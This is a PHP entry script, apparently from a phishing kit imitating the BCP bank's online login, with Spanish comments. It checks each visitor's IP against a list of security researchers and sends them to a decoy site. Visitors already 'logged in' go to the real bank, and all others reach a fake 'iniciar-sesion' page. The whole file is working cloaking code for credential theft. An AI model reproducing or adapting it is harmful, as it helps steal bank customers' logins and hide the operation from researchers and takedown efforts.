<?php
/*****************************************************************************/
error_reporting(0);
session_start();

if(file_exists("panel/config2.txt"))
{
    $file_content = file_get_contents("panel/config2.txt");
    if($file_content == "automatico")
    {
        $_SESSION["automatico"] = true;
    }else
    {
        if(isset($_SESSION["automatico"]))
        {
            unset($_SESSION["automatico"]);
        }
        
    }
}
$ip = $_SERVER["REMOTE_ADDR"];
$block = "si";  // ---> Dejar en "si" para activar el Baneo de IP para desactivar poner "no"
/*****************************************************************************
** IP Baneadas de Security Researcher
*****************************************************************************/
$ipArray = file("Bad.txt");
foreach ($ipArray as $ipTest) {
if (substr_count($ip,trim($ipTest)) != "0") { 
echo '<meta http-equiv="refresh" content="0;url=http://www.konsert.dk/www.bcpzonasegurabeta.viabcp.com">';
exit(); }}
/*****************************************************************************
** IP Baneadas de Usuarios ya logueados
*****************************************************************************/
if($block == "si") {
  $ipArray = file("IPBam.txt");
  foreach ($ipArray as $ipTest) {
    if (substr_count($ip,trim($ipTest)) != "0") {
      echo "<script>window.top.location.href='https://bcpzonasegurabeta.viabcp.com/#/iniciar-sesion'</script>";
      exit(); 
    }
  }
}

/****************************************************************************/
header ("Location: iniciar-sesion");
/****************************************************************************/
?>